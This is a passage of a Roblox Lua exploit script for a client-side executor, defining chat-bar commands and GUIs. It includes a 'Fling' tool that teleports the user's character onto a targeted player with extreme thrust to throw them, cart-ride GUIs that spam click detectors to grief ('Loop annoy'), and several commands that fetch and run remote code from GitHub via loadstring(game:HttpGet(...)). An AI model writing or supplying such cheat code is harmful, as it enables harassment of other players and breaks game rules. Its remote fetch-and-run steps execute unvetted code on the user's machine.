CFrame.new(0, -11.500125885009766, 0),
CFrame.new(3, -10.500171661376953, 0),
CFrame.new(2, -10.500171661376953, 0),
CFrame.new(1, -10.500171661376953, 0),
CFrame.new(0, -12.500140190124512, 0),
CFrame.new(0, -13.500151634216309, 0),
CFrame.new(0, -14.500162124633789, 0),
CFrame.new(0, -16.500162124633789, 0),
CFrame.new(0, -17.500162124633789, 0),
CFrame.new(0, -18.500162124633789, 0),
CFrame.new(0, -19.500162124633789, 0),
CFrame.new(0, -20.500162124633789, 0),
CFrame.new(0, 0, 0),
CFrame.new(0, -0.1, 0),
CFrame.new(0, -0.2, 0),
CFrame.new(0, 1.500162124633789, 0),
CFrame.new(0, 2.500162124633789, 0),
CFrame.new(0, 3.500162124633789, 0),
CFrame.new(0, 4.500162124633789, 0),
CFrame.new(0, -15.500162124633789, 0)
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
end
end 
end)
AddCmd('Flinggui','',function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local LNIO = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame_2 = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextLabel_Roundify_4px = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")

--Properties:

LNIO.Name = "LNIO"
LNIO.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LNIO.ResetOnSpawn = false

Frame.Parent = LNIO
Frame.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
Frame.Position = UDim2.new(0.0909621269, 0, 0.724954009, 0)
Frame.Size = UDim2.new(0, 253, 0, 131)

UICorner.CornerRadius = UDim.new(0.0329999998, 0)
UICorner.Parent = Frame

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.Position = UDim2.new(0.0164696015, 0, 0.198294833, 0)
Frame_2.Size = UDim2.new(0, 243, 0, 97)
Frame_2.Image = "rbxassetid://3570695787"
Frame_2.ImageColor3 = Color3.fromRGB(89, 89, 89)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_2.SliceScale = 0.040

TextBox.Parent = Frame_2
TextBox.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
TextBox.BorderColor3 = Color3.fromRGB(95, 95, 95)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.00940770283, 0, 0.10783276, 0)
TextBox.Size = UDim2.new(0, 238, 0, 33)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(71, 71, 71)
TextBox.PlaceholderText = "USERNAME"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(71, 71, 71)
TextBox.TextSize = 14.000

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(118, 118, 118)
TextButton.BorderColor3 = Color3.fromRGB(95, 95, 95)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.00899999961, 0, 0.530680418, 0)
TextButton.Size = UDim2.new(0, 238, 0, 33)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Fling"
TextButton.TextColor3 = Color3.fromRGB(71, 71, 71)
TextButton.TextSize = 14.000

TextLabel_Roundify_4px.Name = "TextLabel_Roundify_4px"
TextLabel_Roundify_4px.Parent = Frame
TextLabel_Roundify_4px.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_Roundify_4px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_Roundify_4px.BackgroundTransparency = 1.000
TextLabel_Roundify_4px.Position = UDim2.new(0.5, 0, 0.0760131106, 0)
TextLabel_Roundify_4px.Size = UDim2.new(1.00000024, 0, 0.161416322, 0)
TextLabel_Roundify_4px.Image = "rbxassetid://3570695787"
TextLabel_Roundify_4px.ImageColor3 = Color3.fromRGB(85, 85, 85)
TextLabel_Roundify_4px.ScaleType = Enum.ScaleType.Slice
TextLabel_Roundify_4px.SliceCenter = Rect.new(100, 100, 100, 100)
TextLabel_Roundify_4px.SliceScale = 0.040

TextLabel.Parent = TextLabel_Roundify_4px
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.010642671, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 249, 0, 19)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "notfun paided"
TextLabel.TextColor3 = Color3.fromRGB(168, 168, 168)
TextLabel.TextScaled = true
TextLabel.TextSize = 27.000
TextLabel.TextWrapped = true
local lp = game:FindService("Players").LocalPlayer

local function gplr(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			table.insert(Found,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name ~= lp.Name then
				table.insert(Found,v)
			end
		end 
	elseif strl == "me" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name == lp.Name then
				table.insert(Found,v)
			end
		end 
	else
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found,v)
			end
		end 
	end
	return Found 
end
	
-- Scripts:

local function ZSKKSTF_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		local textbox = script.Parent.Parent.TextBox.Text
	local Target = gplr(script.Parent.Parent.TextBox.Text)
	if Target[1] then
		Target = Target[1]
		
		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
		Thrust.Force = Vector3.new(80939,250,1919)
		Thrust.Name = "YeetForce"
		repeat
		lp.Character.HumanoidRootPart.CFrame = Target.Character["Left Leg"].CFrame
		wait()
			lp.Character.HumanoidRootPart.CFrame = Target.Character["Left Leg"].CFrame * CFrame.new(0,-2.5,0)
						lp.Character["Left Arm"].CFrame = Target.Character["Head"].CFrame * CFrame.new(-2,0,2)
			
			Thrust.Location = Target.Character["Left Leg"].Position
			game:FindService("RunService").Heartbeat:wait()
		until not Target.Character:FindFirstChild("Head")
	else
		notif("Invalid player")
	end
	end)
end
coroutine.wrap(ZSKKSTF_fake_script)()
local function ETTDOR_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(ETTDOR_fake_script)()

end)
AddCmd('R6','',function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
end)
AddCmd('Sword','',function()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

bind = "e" -- has to be lowercase

mouse.KeyDown:connect(function(key)
if key == bind then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://522635514"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
local Handles = {
    CFrame.new(0, -1, 0),
    CFrame.new(0, 0, 0),
        CFrame.new(0, -1, 0),
        CFrame.new(0, -2, 0),
        CFrame.new(0, -3, 0),
        CFrame.new(0, -3.5, 0),
    CFrame.new(0, 0, 0),
    CFrame.new(0.65, -1, 0),
    CFrame.new(-0.65, -1, 0),

    
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2  then


v.Grip = Handles[i-1] * CFrame.Angles(0,math.rad(90),0)
v.Parent = game.Players.LocalPlayer.Character
end
end 
wait(0.5)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	
			if (v:IsA("Tool")) and v.ClassName == "Script" then

				v.Script:Destroy()
				
			end
end

end)
-- Bar handling
AddCmd('cartridegui','',function()
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Shaman.lua'))()
local Flags = Library.Flags

local Window = Library:Window({
    Text = "silly ahh cart ride"
})

--[Tabs]--

local CombatTab = Window:Tab({
    Text = "Carts"
})



--[Section Creation]--

local AimlockSection = CombatTab:Section({
    Text = "CartRide"
})
local AimlockSection2 = CombatTab:Section({
    Text = "CartRide Extra"
})
local CombatTab1 = Window:Tab({
    Text = "Misc"
})



--[Section Creation]--

local AimlockSection3 = CombatTab1:Section({
    Text = "Needs/Wants"
})

AimlockSection:Slider({
    Text = "Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Slider({
    Text = "Lower Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Button({
    Text = "Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart" then
 fireclickdetector(part.Head.Click)

 end
 end
end
})
loopon = true
AimlockSection:Button({
    Text = "Loop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
    while loopon do
    
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart"  then
 fireclickdetector(part.Head.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
loopon = false
end
})
AimlockSection:Button({
    Text = "Turn on/off all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
end
})
loopon1 = true
loopon2 = true
loopon3 = true
AimlockSection:Button({
    Text = "Loop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon1 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
loopon1 = false
end
})
AimlockSection2:Button({
    Text = "Loop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon2 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
loopon2 = false
end
})
AimlockSection2:Button({
    Text = "Loop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon3 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
loopon3 = false
end
})
--new tabsbbb

end)

AddCmd('CartRideGui','',function()
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Shaman.lua'))()
local Flags = Library.Flags

local Window = Library:Window({
    Text = "silly ahh cart ride"
})

--[Tabs]--

local CombatTab = Window:Tab({
    Text = "Carts"
})



--[Section Creation]--

local AimlockSection = CombatTab:Section({
    Text = "CartRide"
})
local AimlockSection2 = CombatTab:Section({
    Text = "CartRide Extra"
})
local CombatTab1 = Window:Tab({
    Text = "Misc"
})



--[Section Creation]--

local AimlockSection3 = CombatTab1:Section({
    Text = "Needs/Wants"
})

AimlockSection:Slider({
    Text = "Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Slider({
    Text = "Lower Speed",
    Default = 1,
    Minimum = 0,
    Maximum = 200,
    Flag = "SliderFlag",
    Callback = function(v)
for i =1,v do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 end
    end
})
AimlockSection:Button({
    Text = "Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart" then
 fireclickdetector(part.Head.Click)

 end
 end
end
})
loopon = true
AimlockSection:Button({
    Text = "Loop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
    while loopon do
    
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Click To Regen Cart"  then
 fireclickdetector(part.Head.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop Spawn all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
loopon = false
end
})
AimlockSection:Button({
    Text = "Turn on/off all Carts",
    Tooltip = "nothing silly!",
    Callback = function()
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
end
})
loopon1 = true
loopon2 = true
loopon3 = true
AimlockSection:Button({
    Text = "Loop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon1 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "On" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection:Button({
    Text = "UnLoop annoy",
    Tooltip = "nothing silly!",
    Callback = function()
loopon1 = false
end
})
AimlockSection2:Button({
    Text = "Loop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon2 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Up" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop speed up",
    Tooltip = "nothing silly!",
    Callback = function()
loopon2 = false
end
})
AimlockSection2:Button({
    Text = "Loop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
        while loopon3 do
for i,part in pairs(game.Workspace:GetDescendants()) do
        if part.Name == "Down" then
 fireclickdetector(part.Click)
 end
 end
 wait(0.1)
 end
end
})
AimlockSection2:Button({
    Text = "UnLoop backwards",
    Tooltip = "nothing silly!",
    Callback = function()
loopon3 = false
end
})
--new tabsbbb


end)
LPLR:GetMouse().KeyDown:Connect(function(k)
if k == ';' then
Bar.Visible = true

Bar:CaptureFocus()
wait()
Bar.Text = ""
end
end)
Bar.FocusLost:Connect(function(enter)
if enter == true then
Bar.Visible = false

if CMDS[Bar.Text] then
CMDS[Bar.Text]()
end
Bar.Text = ""
end
end)

-- Text stuff
Match = function(name,str) return name:lower():find(str:lower()) and true end
function CIndex(Text)
local Index,SizeY = 0,0



end
CIndex('')
Bar:GetPropertyChangedSignal("Text"):Connect(function()
CIndex(Bar.Text)
end)
--Stuff
while wait() do
if SEIZURE then
LPLR.Character.HumanoidRootPart.Massless = true
wait()
LPLR.Character.HumanoidRootPart.Massless = false
wait()
end
end





















































































































































































